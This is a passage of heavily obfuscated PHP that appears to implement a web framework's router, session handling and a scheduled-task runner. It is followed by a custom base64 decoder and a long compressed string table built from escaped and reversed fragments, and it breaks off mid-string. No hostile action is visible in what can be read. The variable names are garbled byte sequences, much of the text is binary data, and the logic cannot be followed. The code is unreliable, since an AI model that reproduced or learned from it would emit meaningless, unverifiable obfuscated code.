$eÕµÓÜÓ¯Ì[4]) !== !1) { $cåˆÆˆï ë = str_replace($a•ê±ğÊ¨±, $böˆÓ³ŠÀ¸, $cåˆÆˆï ë); } if (preg_match($eÕµÓÜÓ¯Ì[1453] . $cåˆÆˆï ë . $eÕµÓÜÓ¯Ì[1454], $cË²çùî, $fØñ‹½†Ï)) { if (self::$methods[$B‰ì ËÜîŠ] == $c„ÊÎ…¢­¶ || self::$methods[$B‰ì ËÜîŠ] == $eÕµÓÜÓ¯Ì[1451] || !empty(self::$maps[$B‰ì ËÜîŠ]) && in_array($c„ÊÎ…¢­¶, self::$maps[$B‰ì ËÜîŠ])) { $CÀå‘¹Í‹³ = !0; array_shift($fØñ‹½†Ï); if (!is_object(self::$callbacks[$B‰ì ËÜîŠ])) { $bóÌŒÍÁé‡ = explode($eÕµÓÜÓ¯Ì[8], self::$callbacks[$B‰ì ËÜîŠ]); $FÕºŠº¯Ø = end($bóÌŒÍÁé‡); $fÒ«ŞŒÊÜ§ = explode($eÕµÓÜÓ¯Ì[1452], $FÕºŠº¯Ø); $bÆé´Èô•ì = new $fÒ«ŞŒÊÜ§[0](); if (!method_exists($bÆé´Èô•ì, $fÒ«ŞŒÊÜ§[1])) { echo $eÕµÓÜÓ¯Ì[1455]; } else { call_user_func_array(array($bÆé´Èô•ì, $fÒ«ŞŒÊÜ§[1]), $fØñ‹½†Ï); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$B‰ì ËÜîŠ], $fØñ‹½†Ï); if (self::$halts) { return; } } } } $B‰ì ËÜîŠ++; } } if ($CÀå‘¹Í‹³ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $e”‹×»ÛÌ =& $_SERVER[Š‰]; header($_SERVER[$e”‹×»ÛÌ[1456]] . $e”‹×»ÛÌ[1457]); echo $e”‹×»ÛÌ[1458]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$eÕµÓÜÓ¯Ì[1450]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto B¥ŸØŒº˜ß; A¾¹ÜÑ”±…: $eÕµÓÜÓ¯Ì =& $_SERVER[Š‰]; $cË²çùî = parse_url($_SERVER[$eÕµÓÜÓ¯Ì[1450]], PHP_URL_PATH); $c„ÊÎ…¢­¶ = $_SERVER[$eÕµÓÜÓ¯Ì[156]]; goto cËŞÇÂÄƒ®; B¥ŸØŒº˜ß: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto D‘ù‹¹‚‘; f«á×äã“š: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $E´À¾Ü = new self(); return $E´À¾Ü; goto Dˆø„ƒ§¯®; aÁ¨­¿‡¿Ë: $e„Ô¥É§‚ = $GLOBALS[$d†è¢ƒ‘¡ˆ[6]][$d†è¢ƒ‘¡ˆ[345]]; self::$sessionTime = $e„Ô¥É§‚[$d†è¢ƒ‘¡ˆ[1459]]; $eÔ’Ê¼Ğ„Ò = isset($GLOBALS[$d†è¢ƒ‘¡ˆ[1460]]) ? $GLOBALS[$d†è¢ƒ‘¡ˆ[1460]] : SESSION_ID; goto AÓÇÃÖÃÃó; D‘ù‹¹‚‘: $d†è¢ƒ‘¡ˆ =& $_SERVER[Š‰]; static $E´À¾Ü = false; if ($E´À¾Ü) { return $E´À¾Ü; } goto aÁ¨­¿‡¿Ë; Bï¯Û†ò‹è: $f›Ñ§‘¾„» = $e„Ô¥É§‚[$eåÂ—Ïèñ]; $a‡ˆ¼ŸÕ³ê = $e„Ô¥É§‚[$d†è¢ƒ‘¡ˆ[778]]; switch ($eåÂ—Ïèñ) { case $d†è¢ƒ‘¡ˆ[17]: self::$handle = Model($d†è¢ƒ‘¡ˆ[779]); break; case $d†è¢ƒ‘¡ˆ[780]: self::$handle = new CacheRedis($f›Ñ§‘¾„», $a‡ˆ¼ŸÕ³ê); break; case $d†è¢ƒ‘¡ˆ[781]: self::$handle = new CacheMemcached($f›Ñ§‘¾„», $a‡ˆ¼ŸÕ³ê); break; case $d†è¢ƒ‘¡ˆ[173]: $f›Ñ§‘¾„»[$d†è¢ƒ‘¡ˆ[75]] = $f›Ñ§‘¾„»[$d†è¢ƒ‘¡ˆ[75]] . $d†è¢ƒ‘¡ˆ[1462]; self::$handle = new CacheFile($f›Ñ§‘¾„», $a‡ˆ¼ŸÕ³ê); default: break; } goto f«á×äã“š; AÓÇÃÖÃÃó: if (self::$sessionSign) { } else { if (Cookie::get($eÔ’Ê¼Ğ„Ò)) { self::$sessionSign = Cookie::get($eÔ’Ê¼Ğ„Ò); } else { self::$sessionSign = guid(); } } Cookie::setSafe($eÔ’Ê¼Ğ„Ò, self::$sessionSign, self::$sessionTime); $eåÂ—Ïèñ = $e„Ô¥É§‚[$d†è¢ƒ‘¡ˆ[1461]]; goto Bï¯Û†ò‹è; Dˆø„ƒ§¯®: } public static function sign($DÒ‘³ç‡Ş = false) { $DÒ‘³ç‡Ş && (self::$sessionSign = $DÒ‘³ç‡Ş); self::init(); return self::$sessionSign; } public static function set($D¦ÏÊá‘¶, $BãØÃ‹¯Æ = false) { self::init(); if (is_array($D¦ÏÊá‘¶)) { foreach ($D¦ÏÊá‘¶ as $bï‰îÚ‹¸ => $B¬ßƒŠ…é¥) { array_set_value(self::$data, $bï‰îÚ‹¸, $B¬ßƒŠ…é¥); } } else { array_set_value(self::$data, $D¦ÏÊá‘¶, $BãØÃ‹¯Æ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($f×ƒƒÀ‡º‚ = false) { self::init(); if (!$f×ƒƒÀ‡º‚) { return self::$data; } return array_get_value(self::$data, $f×ƒƒÀ‡º‚); } public static function remove($bÖãØ¾·†) { self::init(); unset(self::$data[$bÖãØ¾·†]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Š‰][783])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto dÑ²„Û›•÷; Aª¬ç¡Â˜ë: http_close(); self::valueSet($bËÊ¡¥¯¶Ó[1463], $bËÊ¡¥¯¶Ó[86]); Hook::bind($bËÊ¡¥¯¶Ó[1465], $bËÊ¡¥¯¶Ó[1466]); goto b–ÄªßÉ¶; dÑ²„Û›•÷: $bËÊ¡¥¯¶Ó =& $_SERVER[Š‰]; if (self::valueGet($bËÊ¡¥¯¶Ó[702]) != $bËÊ¡¥¯¶Ó[86]) { return; } if (self::valueGet($bËÊ¡¥¯¶Ó[1463]) == $bËÊ¡¥¯¶Ó[86]) { $A¾š‹’äÃ· = self::valueGet($bËÊ¡¥¯¶Ó[1464]); if (time() - $A¾š‹’äÃ· > 3600 * 2) { self::restart(); } return; } goto Aª¬ç¡Â˜ë; b–ÄªßÉ¶: while (!0) { self::cacheClear(); if (self::valueGet($bËÊ¡¥¯¶Ó[702]) != $bËÊ¡¥¯¶Ó[86]) { self::valueSet($bËÊ¡¥¯¶Ó[1463], $bËÊ¡¥¯¶Ó[491]); self::log($bËÊ¡¥¯¶Ó[1467]); die; } self::valueSet($bËÊ¡¥¯¶Ó[1463], $bËÊ¡¥¯¶Ó[86]); self::valueSet($bËÊ¡¥¯¶Ó[1464], time()); self::taskRunAll(); sleep(self::valueGet($bËÊ¡¥¯¶Ó[1468])); } goto BšÖ†ÈµŸ; BšÖ†ÈµŸ: } public static function restart() { $CãªÃ¼®³Ó =& $_SERVER[Š‰]; http_close(); self::valueSet($CãªÃ¼®³Ó[702], $CãªÃ¼®³Ó[491]); sleep(self::valueGet($CãªÃ¼®³Ó[1468]) + 5); self::valueSet($CãªÃ¼®³Ó[1463], $CãªÃ¼®³Ó[491]); self::valueSet($CãªÃ¼®³Ó[702], $CãªÃ¼®³Ó[86]); } public static function shutdownEvent() { $b£·‹…ƒÓ‰ =& $_SERVER[Š‰]; self::valueSet($b£·‹…ƒÓ‰[1463], $b£·‹…ƒÓ‰[491]); self::log($b£·‹…ƒÓ‰[1469]); } public static function config($aÄìˆÙŸ°, $b‹Áœ•ù…) { $d”×ãòóŞ =& $_SERVER[Š‰]; $e£–ò‡Ÿ­á = 10; $b‹Áœ•ù… = intval($b‹Áœ•ù…) <= $e£–ò‡Ÿ­á ? $e£–ò‡Ÿ­á : intval($b‹Áœ•ù…); self::valueSet($d”×ãòóŞ[702], $aÄìˆÙŸ°); self::valueSet($d”×ãòóŞ[1468], $b‹Áœ•ù…); } private static function taskRunAll() { goto c‰çó¥ƒª; c‰çó¥ƒª: $EãÃ¿ŞœõŠ =& $_SERVER[Š‰]; $D°êÀ•õê¥ = timeFloat(); $dïÃºÄ¯ï = Model($EãÃ¿ŞœõŠ[1470])->listData(); goto F à¶‚£¾†; F à¶‚£¾†: $F—ª›Á½¢ç = count($dïÃºÄ¯ï); for ($DŞ²Ë©‹­Õ = 0; $DŞ²Ë©‹­Õ < $F—ª›Á½¢ç; $DŞ²Ë©‹­Õ++) { $cå¦Õºééà = $dïÃºÄ¯ï[$DŞ²Ë©‹­Õ]; if (!$cå¦Õºééà[$EãÃ¿ŞœõŠ[388]] || $cå¦Õºééà[$EãÃ¿ŞœõŠ[1471]] != $EãÃ¿ŞœõŠ[86]) { continue; } if (!self::taskTimeCheck($cå¦Õºééà)) { continue; } self::taskRun($cå¦Õºééà); } Hook::trigger($EãÃ¿ŞœõŠ[1472]); goto C“êçŸÅß; C“êçŸÅß: self::taskQueueRun($D°êÀ•õê¥); self::closeDatabase(); goto dÄÁ¸«”ñ; dÄÁ¸«”ñ: } private static function taskQueueRun($C´™»âƒè) { $d–ƒŸ˜§„» = 10; while (!0) { $Eƒ½¼ó§³ö = TaskQueue::run(); if ($Eƒ½¼ó§³ö === !1) { break; } if (timeFloat() - $C´™»âƒè >= $d–ƒŸ˜§„») { break; } } } private static function taskTimeCheck($CîŒòéÓ©) { goto EğÜÙœÕŸ; EğÜÙœÕŸ: $f©Áñ¾Ü© =& $_SERVER[Š‰]; $A‡ªÎÔø¤‡ = json_decode($CîŒòéÓ©[$f©Áñ¾Ü©[195]], !0); $C—¤ò™ÚŠè = intval($CîŒòéÓ©[$f©Áñ¾Ü©[1464]]); goto B£è–…ÂÖñ; B£è–…ÂÖñ: $aèŒËÂ”¸ = strtotime($f©Áñ¾Ü©[1473] . $A‡ªÎÔø¤‡[$f©Áñ¾Ü©[1474]] . $f©Áñ¾Ü©[1475]) - strtotime($f©Áñ¾Ü©[1476]); $FÚ¾ÜôÉÉ = time() - strtotime(date($f©Áñ¾Ü©[1477]) . $f©Áñ¾Ü©[1478]); $a–¢Í¦‰¾‹ = $FÚ¾ÜôÉÉ >= $aèŒËÂ”¸ && $FÚ¾ÜôÉÉ <= $aèŒËÂ”¸ + 3600; goto e´µÚ‡²¦ß; e´µÚ‡²¦ß: switch ($A‡ªÎÔø¤‡[$f©Áñ¾Ü©[29]]) { case $f©Áñ¾Ü©[1479]: if (time() - $C—¤ò™ÚŠè < 3600 * 24 * 30) { return !1; } if ($A‡ªÎÔø¤‡[$f©Áñ¾Ü©[1479]] == date($f©Áñ¾Ü©[1480]) && $a–¢Í¦‰¾‹) { return !0; } break; case $f©Áñ¾Ü©[1481]: if (time() - $C—¤ò™ÚŠè < 3600 * 24 * 7) { return !1; } $EÔŠ…çôò‘ = date($f©Áñ¾Ü©[1482]) == 0 ? 7 : date($f©Áñ¾Ü©[1482]); if ($A‡ªÎÔø¤‡[$f©Áñ¾Ü©[1481]] == $EÔŠ…çôò‘ && $a–¢Í¦‰¾‹) { return !0; } break; case $f©Áñ¾Ü©[1474]: if (time() - $C—¤ò™ÚŠè < 3600 * 24) { return !1; } if ($a–¢Í¦‰¾‹) { return !0; } break; case $f©Áñ¾Ü©[1483]: if (time() - $C—¤ò™ÚŠè >= floatval($A‡ªÎÔø¤‡[$f©Áñ¾Ü©[1483]]) * 60) { return !0; } break; default: break; } return !1; goto d¼º—ÃÙŠ¸; d¼º—ÃÙŠ¸: } private static function closeDatabase() { goto cëÛˆ¬é–•; Fˆë¿¾„¾˜: if (!$DÏË‰¡¢ã’) { $DÏË‰¡¢ã’ = time(); } if (time() - $DÏË‰¡¢ã’ < $A‹†³Ó³°İ) { return; } $DÏË‰¡¢ã’ = time(); goto fƒ­×•”ä¸; cëÛˆ¬é–•: $Añ¥ĞŠª¦ =& $_SERVER[Š‰]; static $DÏË‰¡¢ã’ = 0; $A‹†³Ó³°İ = 1800; goto Fˆë¿¾„¾˜; fƒ­×•”ä¸: $B©Ã”é¬³· = Model($Añ¥ĞŠª¦[497])->db($Añ¥ĞŠª¦[33]); if ($B©Ã”é¬³·) { $B©Ã”é¬³·->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($Añ¥ĞŠª¦[1484], $Añ¥ĞŠª¦[1485]); die; } goto Cœº‘¡â«é; Cœº‘¡â«é: } public static function taskRun($d³ÕŸŞ’µ) { goto FÉ½Û«šÓè; DíğÎ¯Òø: Model($E‰¤Ö›Ë†[1490])->add(array($E‰¤Ö›Ë†[1491] => $E‰¤Ö›Ë†[33], $E‰¤Ö›Ë†[1492] => $E‰¤Ö›Ë†[491], $E‰¤Ö›Ë†[29] => $E‰¤Ö›Ë†[1493] . $d³ÕŸŞ’µ[$E‰¤Ö›Ë†[388]], $E‰¤Ö›Ë†[1494] => json_encode(array($E‰¤Ö›Ë†[28] => $d³ÕŸŞ’µ[$E‰¤Ö›Ë†[28]], $E‰¤Ö›Ë†[1495] => timeFloat() - $aí¿ÆÏäç, $E‰¤Ö›Ë†[289] => $B÷ğâ‡ëœ›)))); self::log($E‰¤Ö›Ë†[1496] . $d³ÕŸŞ’µ[$E‰¤Ö›Ë†[388]] . $E‰¤Ö›Ë†[1497] . $B÷ğâ‡ëœ›); return !0; goto C®µ³îŒ÷Ö; FÉ½Û«šÓè: $E‰¤Ö›Ë† =& $_SERVER[Š‰]; self::log($E‰¤Ö›Ë†[1486] . $d³ÕŸŞ’µ[$E‰¤Ö›Ë†[388]] . $E‰¤Ö›Ë†[1487] . $d³ÕŸŞ’µ[$E‰¤Ö›Ë†[28]] . $E‰¤Ö›Ë†[1488] . $d³ÕŸŞ’µ[$E‰¤Ö›Ë†[1489]]); Model($E‰¤Ö›Ë†[1470])->run($d³ÕŸŞ’µ[$E‰¤Ö›Ë†[388]]); goto D¦¨”¬ÏİÓ; D¦¨”¬ÏİÓ: $aí¿ÆÏäç = timeFloat(); $B÷ğâ‡ëœ› = $E‰¤Ö›Ë†[33]; switch ($d³ÕŸŞ’µ[$E‰¤Ö›Ë†[29]]) { case $E‰¤Ö›Ë†[303]: $Fğ¤Ëù‚ìõ = url_request($d³ÕŸŞ’µ[$E‰¤Ö›Ë†[1489]], $E‰¤Ö›Ë†[226], !1, !1, !1, !1, 5); $B÷ğâ‡ëœ› = strlen($Fğ¤Ëù‚ìõ); break; case $E‰¤Ö›Ë†[225]: $B÷ğâ‡ëœ› = Hook::apply($d³ÕŸŞ’µ[$E‰¤Ö›Ë†[1489]]); default: break; } goto DíğÎ¯Òø; C®µ³îŒ÷Ö: } private static function valueGet($FˆéˆÒ¬‚Ö) { $c±›ù™× =& $_SERVER[Š‰]; $f±ŒŠ¿±‘™ = $c±›ù™×[1498]; $a˜“¥¯Üì‰ = Model($c±›ù™×[1499])->get($FˆéˆÒ¬‚Ö, $f±ŒŠ¿±‘™); if (is_null($a˜“¥¯Üì‰)) { Model($c±›ù™×[1499])->set($c±›ù™×[1468], 10, $f±ŒŠ¿±‘™); Model($c±›ù™×[1499])->set($c±›ù™×[702], $c±›ù™×[86], $f±ŒŠ¿±‘™); Model($c±›ù™×[1499])->set($c±›ù™×[1463], $c±›ù™×[491], $f±ŒŠ¿±‘™); $a˜“¥¯Üì‰ = Model($c±›ù™×[1499])->get($FˆéˆÒ¬‚Ö, $f±ŒŠ¿±‘™); } return $a˜“¥¯Üì‰; } private static function valueSet($fß´çÆÅÁ, $eÏİÊæÎëÍ) { $fŸ­±é¡òµ =& $_SERVER[Š‰]; return Model($fŸ­±é¡òµ[1499])->set($fß´çÆÅÁ, $eÏİÊæÎëÍ, $fŸ­±é¡òµ[1498]); } protected static function log($e˜¥Ôƒ—È) { write_log($e˜¥Ôƒ—È, $_SERVER[Š‰][1485]); } private static function cacheClear() { $fºã¢ßù÷Í =& $_SERVER[Š‰]; $cŸæ½‚Êù‘ = Model($fºã¢ßù÷Í[1499])->cacheKey($fºã¢ßù÷Í[1498]); Cache::clearMemory($cŸæ½‚Êù‘); Model($fºã¢ßù÷Í[1470])->cacheClear(); } } goto a… á’ö¶¢; c—éîîá“…: if (!function_exists('_kodDe')) { function _kodDe($d­¦¥ßóä) { $d­¦¥ßóä = base64_decode($d­¦¥ßóä); $cÔÓ„ƒ¿‡ = strlen($d­¦¥ßóä); $Dï÷ÚÛÇ—• = ''; $B™Ùô¥ç‡Ï = ord($d­¦¥ßóä[0]) - 30; for ($eÑ–…ÉñÊ = 1; $eÑ–…ÉñÊ < $cÔÓ„ƒ¿‡; $eÑ–…ÉñÊ += 2) { if ($eÑ–…ÉñÊ + 1 < $cÔÓ„ƒ¿‡) { $Dï÷ÚÛÇ—• .= chr(ord($d­¦¥ßóä[$eÑ–…ÉñÊ + 1]) + $B™Ùô¥ç‡Ï); $Dï÷ÚÛÇ—• .= chr(ord($d­¦¥ßóä[$eÑ–…ÉñÊ]) + $B™Ùô¥ç‡Ï); } else { $Dï÷ÚÛÇ—• .= chr(ord($d­¦¥ßóä[$eÑ–…ÉñÊ]) + $B™Ùô¥ç‡Ï); } } return $Dï÷ÚÛÇ—•; } } define("\212\211", "\256\200\300\371\212\327"); $_SERVER[Š‰] = explode("\x7c\x4\x7c\x3\x7c\x2", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\11\174\123\125\366\260\376\325\21\167\307\35\67\36\105\354\102\226\226\235\102\201\264\115\333\110\232\224\44\245\40\51\341".strrev('ÇeÇFdttFTg'."\r".'Á×}ÃqE'."\r".'ÄQÑ†Pu\\DF\\t½ï¥ä›^my%').base64_decode('cfzufu97SZ3/9/s+fkDuvpx77rnn3HvOeevfuPyeG5f/a/Ghiw9Z/D9ff7P2').strrev('ey.ùFò½Ğı_Gc‘âi¬¬¢¸¬‡?¡aŠÄxqƒßƒÅñÄ®«mÏ~?O7')."\320\277\365\65\337\61\157\154\74\317\273\347\266\255\3\173\16\76\150\333\63\277\137\136\15\12\343\272\325\370\107\312\152\246\244\364\253\206\151\340\204\204\226\355\120"."\x3b\x71\x58\xcd\xe2\x5f\x37\xfe\x31\x7a\xd2\xaa\xa9\xe0\x70\x2c\x10\x8c\xc4\xc2\xad\x2d\x2d\xde\x50\x24\x46\x5a\x14\xf3\x33\x5a\x92\x84\x72\xb2\x2e\x67\x48\xe3\x39\x45\x37\x40\x57"."\142\163\261\234\226\123\262\226\24\236\220\224\115\71\56\33\244\245\372\332\130\275\267\305\37\234\27\213\314\153\361\222\22\361\130\117\136\321\7\160\14\5\303\246\254"."\x9b\x11\x35\xa3\xb0\x12\x7d\x3a\x1b\x57\xad\xb7\xd1\x17\x90\x22\x21\x4f\x20\xec\xa9\x8b\xf8\x82\x1\x9c\x5c\x17\x6c\x6e\xf6\x45\xa\xd3\x43\x41\xbf\xbf\xd6\x53\x37\xab\x30\xa7\x25"."\xe4\x69\x6c\xf6\x48\x60\x7c\x69\x25\xa6\x66\x3b\xb4\x32\x69\x21\xce\x59\x28\x95\xe3\x40\x83\xaa\xa4\x93\x38\x98\x95\xe9\x70\xcc\x81\x1c\x9\x45\x58\x8\xac\x41\x36\x9f\x4e\xe3\x48"."\x80\x85\xc8\xf8\x95\xe\x39\x9f\x26\x30\xab\x17\x23\x39\x5d\xcd\xc8\x74\xea\xb3\x94\x1\x96\x8a\x3\x72\xde\xd4\xd4\x6c\x2\x47\xbc\xfd\xa6\x2e\xf3\x74\x30\xe2\x84\xae\x64\x94\x2c"."\151\52\354\365\173\353\42\22\34\246\324\20\12\66\113\144\51\62\262\141\52\272\324\326\344\15\171\45\70\364\232\122\64\343\122\11\327\153\15\0\200\110\36\277\137"."\x1a\xaa\x5\x53\xc9\xe4\x68\x33\xb8\x4e\x91\xc6\x82\xa1\x7a\x6f\x48\xaa\x9d\x27\x71\x38\x25\xb4\x4c\x46\xcb\xba\x40\x2b\x60\x3d\x4d\x61\xa8\xde\x50\x8\x7\x1c\x4\x83\xfd\x3e\xb8".base64_decode('dCQSbGgIe1mMTG62H4xkHMFSSyzZkTZjvXI6T5G1G/+Wkh/yqxkEgXvUrJon').base64_decode('yEqa0DS2c0ggT0srNCUDqmlkT4EN1ouDNdPx71RSKB6DeYpuxpRsQkuqWbIN')."\147\220\55\107\20\117\66\123\365\272\12\312\221\6\65\127\102\313\15\64\153\275\144\16\35\152\132\361\263\135\326\241\245\223\212\316\343\71\120\135\314\41\223\121\7".base64_decode('hdqBfEYswqKJlJpO6nRz/lxJsP3VjgG+CQ0trycUH9gmvG4LG0kVKaSYJpi0').base64_decode('QefVmktrcjKs6MJcG0DFYN4UE/OoWIOmZ+oBuSD9g02ithbJ6KbbJCmA0EXI')."\134\331\374\213\235\377\151\237\77\23\374\127\116\150\136\224\14\55\245\244\323\61\245\137\41\333\51\223\234\140\320\271\272\215\270\232\165\203\24\34\365\5\143\51\331"."\110\65\47\47\304\120\55\112\112\223\112\277\53\227\312\221\35\317\66\171\324\202\356\160\165\2\232\351\25\10\162\132\113\310\151\161\246\70\234\62\315\134\130\311\46"."\x21\x40\xc8\x8c\xb4\xbe\x2c\x2\x58\x4e\x51\x48\xa1\x7a\x87\x94\x94\x9a\xa5\x79\x52\x53\xb5\x5a\x6d\xd0\x8a\x99\x34\xb\xd1\xd9\xb1\x34\x83\x25\x9a\xfd\x4\x63\x4a\x48\x5c\xe9\x37"."\11\120\244\251\211\224\254\203\345\252\311\233\35\316\311\204\254\344\162\151\65\41\233\252\226\165\153\11\123\61\235\206\251\53\62\151\315\223\110\50\206\341\254\323\262"."\246\256\245\235\236\164\132\353\163\6\165\265\123\315\126\113\25\204\10\203\114\260\315\235\220\60\126\223\275\133\62\125\202\270\2\351\102\5\356\215\356\111\126\132\227"."\263\106\207\242\73\275\144\323\124\113\140\75\30\135\244\305\352\125\43\247\31\52\34\136\265\44\233\246\234\110\101\232\302\233\257\371\231\362\152\66\255\146\225\202\262"."\xde\xfe\x9c\xaa\x2b\x6\x1d\xab\xd4\xd8\x1c\x21\x8d\x80\xd6\x15\x67\x8b\x2e\x77\x66\xe4\x6a\x29\x97\x8f\x3\xc8\x90\xdd\x5b\x24\xd\x97\x26\xa0\xa9\x96\x12\x30\xea\x90\x32\x79\xc3".base64_decode('dOoKIE4qOAbJGvs6nM1wa6lK0hkGNJwkj6scLwG0kWgeTm2KRFpivgZwVAe8')."\xb1\x66\x4f\xa4\xae\x89\xc\xdb\x94\x3b\xe9\x98\xfd\x80\x32\xb3\x26\x69\xe2\x5c\x27\xd8\x62\x10\xb1\x2\x60\xae\x3c\xb1\x45\xeb\x53\x74\xd0\x71\xed\x40\xb5\xd4\xad\x25\xe3\x5a\xbf".base64_decode('i2bBwmFAQ2hhuNw50xmSs50QPvEBUyHoZ/R2WgHtV7KdZopWDHtDc7yhWDjY').base64_decode('EGnzhMghnwVY0k+7gk2nnSElCUCfMGk9OQehRsvAjQHXiubCzULz/L5GCJh6')."\247\1\12\71\305\122\264\155\277\232\121\341\330\115\226\203\40\11\70\200\106\62\40\67\232\120\115\64\125\121\26\115\216\51\167\202\377\53\312\347\107\353\135\25\355".strrev('7«vwÄáĞ6ÖØKÀ'."\0".'úÎ'."\n".'R¢P]&D´åQ%€-J\'+cIUr®ã¯*Ü3').base64_decode('iTV7I03BetKD10NCfg1vTTqj+fin3cXpMVhzX0butFFpGGvWdMWawk+NNjVJ').base64_decode('yTiMNilqZ4rMT4WtJbS0pstpSMUoEiuUsnSqHWR9MMHkkbCayVG6ZqbymbgQ')."\164\363\241\220\176\301\312\323\203\46\245\261\203\116\323\111\250\332\115\252\214\36\333\100\151\264\73\74\16\374\345\4\71\251\145\144\312\356\42\342\244\44\61\165\302".strrev('ÀË×ÜJ¤¸P­%I”tllòèTêå‘¥3šE-ÕL›©§\'æE&œ–I')."\x5\x18\x35\x10\xe6\x67\xa9\x6a\x84\x40\x41\xc8\x38\xd1\x78\x1b\xe4\x6f\x79\x82\xc9\x8a\xa6\xc1\x31\x12\x8c\x77\x81\x7d\x42\x58\x8\xd5\x68\x10\x4e\xfd\x98\x86\xf2\xc0\x58\x65\x5e"."\276\105\127\72\124\262\333\262\140\251\232\145\275\233\126\0\113\303\317\33\30\21\32\153\150\365\373\143\165\301\100\4\360\314\70\245\55\344\213\170\51\162\172\352\143"."\236\272\26\166\172\362\245\46\5\40\245\50\74\6\160\112\357\130\341\10\342\147\25\247\342\364\214\205\124\32\207\1\131\316\151\131\103\161\46\110\153\111\116\317\161"."\x89\xa9\x36\x62\x5e\x50\x83\x73\xea\xfd\x4e\x39\x33\xe8\xcc\x0\x30\x39\xd9\xd0\xad\x47\xab\x14\x11\x4f\x68\x1f\x59\x46\x4e\xb7\x21\x60\x81\x20\x44\xcf\xf4\x96\x60\x98\x54\x98\x1".base64_decode('UwHbFFd0Mo6WVpKVEVCo0UsSj6THtEyYJk9bmNLcPCivq4Myn+MMOh7Sdn8m')."\315\71\101\353\254\234\174\55\42\115\276\300\254\130\163\260\336\353\217\371\2\200\40\105\12\323\133\133\352\75\164\161\305\364\332\140\244\311\222\332\12\110\322\34\217"."\337\147\57\356\235\353\13\107\302\105\263\100\132\253\327\226\3\144\277\226\220\267\301\67\227\105\33\174\136\177\175\70\126\347\251\153\342\145\2\236\146\22\211\165\100"."\351\313\160\133\313\307\0\155\15\63\31\56\326\13\345\121\12\254\230\105\140\212\121\121\40\306\361\0\234\223\12\301\75\62\135\50\5\243\231\20\346\74\241\345\51"."\x36\x32\xfe\x30\x43\x89\x48\x46\x26\xdb\x4a\xa6\x67\x60\x19\xfe\x29\x97\x3c\x61\xc9\xcc\xc5\x18\xb9\x88\xf\xb0\x20\x9a\x6\x8d\x3\x4e\x90\xf4\x2f\x11\x3a\x5f\x30\x82\x18\x2c\x53"."\xab\x74\x30\x92\x5d\x3c\xc1\xd3\x61\x32\x2a\x60\x8b\x83\x7d\xc1\xf3\xc0\xa\x78\x90\xb8\xd\x30\x1\xad\x48\x8c\xee\x35\x3\x8\x2a\x1e\x3a\x9c\xe\x2e\xea\xc6\x82\x2d\xde\x90\x7".strrev('üş.sübå]èNÊ™˜rl¼ˆ›å'."\0".':¥ô*HĞ0P¶±Ê'."\n".'')."\351\134\311\122\250\307\41\361\146\204\201\12\103\140\67\120\302\253\345\131\157\161\115\113\323\175\12\216\176\106\17\230\244\335\145\120\44\351\247\304\147\14\75\313\310"."\x1\x12\x9\xce\xf2\x6\x62\x14\xb3\x70\x4c\xc0\x46\x9c\x0\x64\xd7\x60\x88\x0\xc4\xd4\xba\xa9\x24\x85\x33\x43\xde\x30\xdd\xe5\xba\xd2\x93\x57\x29\xb8\xdc\xae\x31\x4\x8b\x15\x70"."\106\221\356\335\13\242\175\143\312\346\73\307\270\332\101\240\274\142\46\216\222\130\324\145\211\236\103\352\347\165\126\33\162\104\145\306\214\362\352\250\73\352\56\233\121"."\75\337\343\34\224\235\203\225\316\51\316\366\61\121\127\371\30\222\320\276\150\254\143\374\22\130\0\24\234\61\252\35\374\324\104\147\214\216\72\317\275\140\341\314\371"."\xd1\xf6\xd2\xea\x31\x23\xa3\xae\x51\xd1\xbe\xf6\x8a\xf2\x19\xb4\x9f\x44\x5e\x7\x52\x62\x62\x80\xd\x35\x39\xa6\xc\xc\x9\x70\x4a\xac\x48\x16\x91\x3c\xa1\x0\xcd\x18\x54\x73\x3c".base64_decode('ddHEJTQdrKHSyWvMd0bHtM8Q6glJ9r4AlwTob4qV8zjPhzNjVeG+J/iRzyY4')."\365\204\373\42\56\47\10\35\120\73\263\154\13\201\103\237\111\347\126\6\175\321\150\374\273\204\56\144\247\322\117\111\103\266\103\325\11\166\346\263\152\17\275\163\310"."\52\75\44\240\231\24\277\343\212\331\247\120\364\0\351\226\70\100\16\52\21\202\54\41\226\106\374\40\351\201\113\146\12\22\123\310\54\162\61\310\214\365\261\130\122"."\311\222\165\72\202\224\66\22\162\116\11\13\63\214\305\42\236\132\277\67\106\51\14\241\304\64\216\250\142\55\273\245\3\123\343\24\225\322\207\4\347\316\221\40\102"."\x76\xbe\xd1\x93\x96\x10\x61\x90\x14\x5d\xd7\xf4\x6a\x74\x1b\x69\xe4\x73\x90\x77\x3\x42\x97\x9\x60\x2b\x1\x89\x5d\xaa\x99\x2e\x61\x90\x93\x7a\x31\x71\x1\x72\x32\xe5\x1c\xa0\x10".base64_decode('zbgBd1k0mp+vJNvnA6SWnR3ti8YtKafMuTsK/tAIpmVk9Dm+lgbgzSjn5Cly').base64_decode('aRZj1DAGzmcXHAe7ALFEWDaOajpjmnIWftvUTDltaSICUyhpogc3uSvAq+3n').strrev('`<&¶øoœ\'T=‚Ï…(Jkÿâd!ÂV.˜¬#X.ë„>nÆ¡v§"#Âå